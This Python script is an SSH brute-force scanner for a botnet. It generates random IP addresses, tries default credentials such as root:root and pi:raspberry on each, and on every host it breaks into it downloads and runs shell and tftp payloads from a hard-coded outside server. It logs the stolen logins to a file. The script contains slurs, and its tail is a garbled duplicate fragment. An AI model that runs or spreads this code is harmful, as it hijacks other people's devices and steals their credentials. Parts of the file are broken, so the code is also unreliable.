#!/usr/bin/env python
# Credit to Ozn & Vamp

import threading, paramiko, random, socket, time, sys

paramiko.util.log_to_file("/dev/null")

blacklist = [
    '127'
]

passwords = [ 
    "root:root",
    "root:admin",
    "admin:admin",
    "ubnt:ubnt"
    "root:1234",
    "admin:1234",
    "guest:guest",
    "user:user",
    "test:test",
    "pi:raspberry",
    "vagrant:vagrant"
]

dongs = random.choice(["Self Destruct A Small Village Of Japanese Orphans","Blow Up Your Toaster",
                     "Call An Anonymous Bomb Threat","Purchase Somebodys Sleep Schedule"])
raw_input('Press <ENTER> To '+dongs)

ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "B":
                        self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "C":
                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "BRAZIL":
                        br = ["179.105","179.152","189.29","189.32","189.33","189.34","189.35","189.39","189.4","189.54","189.55","189.60","189.61","189.62","189.63","189.126"]
                        self.host = random.choice(br)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "SUPER":
                        yeet = ["122","131","161","37","186","187","31","188","201","2","200"]
                        self.host = random.choice(yeet)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY":
                        lucky = ["125.24","125.25","125.26","125.27","125.28","113.53","101.51","101.108","118.175","118.173","182.52","180.180"]
                        self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY2":
                        lucky2 = [ "122.178","122.170","182.65","182.68","182.70","182.75","186.112","186.113","186.114","186.115","186.116","186.118" ]
                        self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "RAND":
      self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    else:
                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    for badip in blacklist:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                username='root'
                password=""
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("echo '\x67\x61\x79\x66\x67\x74'")
                output = stdout.read()
                if "gayfgt" in output:
                    badserver=False
                if badserver == False:
                        print 'Found '+self.host+'|'+username+'|'+password+'|'+str(port)
                        ssh.exec_command("cd /tmp; wget http://89.34.99.189/bins.sh || curl -O http://89.34.99.189/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 89.34.99.189 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 89.34.99.189; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh")
                        time.sleep(15)
                        file_h = open(sys.argv[4],'a')
                        file_h.write(self.host+":"+username+":"+password+"\n")
                        file_h.close()
                        ssh.close()
            except:
                pass

for x in range(0,int(sys.argv[1])):
    try:
        t = sshscanner()
        t.start()
    except:
        pass
self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    for badip in blacklist:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break